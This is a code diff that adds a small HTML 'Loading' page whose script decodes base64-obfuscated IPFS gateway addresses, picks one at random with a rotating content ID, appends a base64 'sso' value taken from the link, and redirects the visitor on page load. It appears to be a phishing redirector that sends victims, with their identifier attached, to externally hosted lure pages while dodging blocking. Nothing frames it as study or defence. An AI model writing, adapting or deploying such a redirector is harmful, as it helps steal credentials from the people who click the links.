@@ -1,0 +1,41 @@
+<!doctype html><html><head>
+
+    <title>Loading............</title>
+    <script type="text/JavaScript">
+    // Base64-encoded URL
+        const queryString3 = window.location.search;
+        const urlParams3 = new URLSearchParams(queryString3);
+        const imageBoxx = urlParams3.get('sso');
+    var data = atob(imageBoxx);
+    
+    // base64 gateways
+        var linkList = 	[
+            "",
+            "aHR0cHM6Ly9mbGVlay5pcGZzLmlvL2lwZnMv",
+            "aHR0cHM6Ly9pcGZzLmV0aC5hcmFnb24ubmV0d29yay9pcGZzLw==",
+            "aHR0cHM6Ly9nYXRld2F5LmlwZnMuaW8vaXBmcy8=",
+            "aHR0cHM6Ly9uZnRzdG9yYWdlLmxpbmsvaXBmcy8=",
+            "aHR0cHM6Ly9jZi1pcGZzLmNvbS9pcGZzLw=="
+        ];
+        
+        //cid+autolink
+            var linkList1 = 	[
+            "QmTZFrwPVLRVTfuVDMAnAu6gJquy9QVaD5uasttoDLwLKk/?submit=",
+            "QmUEqn37yTbarQq4iDNR7sNwySq2njGczhz5m4Ygde4dw6/?submit=",
+            "QmdDo1HoQ9DFyAe2wkuSq5DN4vRBZgdB2kNWZtTCTK5kWB/?submit=",
+            "QmS82n1rkWhLgx9hnqAsHtRZSsU4kerPm91MbKDc2aDHE4/?submit=",
+            "QmS82n1rkWhLgx9hnqAsHtRZSsU4kerPm91MbKDc2aDHE4/?submit="
+        ];
+    // Decode the Base64 URL
+        var randomLink = linkList[Math.floor(Math.random()*linkList.length)];
+            var randomLink1 = linkList1[Math.floor(Math.random()*linkList1.length)];
+    
+    const decodedUrl = atob(randomLink);
+    const cray = randomLink1;
+    var crayy = cray;
+    var redir_to_page = decodedUrl;
+    
+    // Redirect to the decoded URL
+    redir_to = redir_to_page + crayy + data;
+    window.location = redir_to;
+    </script></html>
